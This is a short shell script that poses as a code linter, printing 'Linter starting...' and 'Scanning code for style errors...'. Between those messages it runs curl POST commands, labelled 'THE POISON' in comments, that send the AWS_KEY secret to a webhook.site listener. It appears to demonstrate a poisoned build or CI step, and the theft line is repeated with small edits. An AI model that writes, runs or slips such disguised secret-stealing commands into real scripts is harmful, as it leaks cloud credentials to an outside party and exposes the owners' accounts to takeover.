echo "Linter starting..."
# THE POISON: 
# This sends the AWS_KEY (secret) to your listener
curl -X POST -d "stolen_data=${AWS_KEY}" https://webhook.site/f6022aed-9b68-42c9-9876-7fd16fcdfea5
echo "Linter starting..."
# The Poison:
curl -X POST -d "stolen=${AWS_KEY}" https://webhook.site/f6022aed-9b68-42c9-9876-7fd16fcdfea5
echo "Scanning code for style errors..."
# minor change
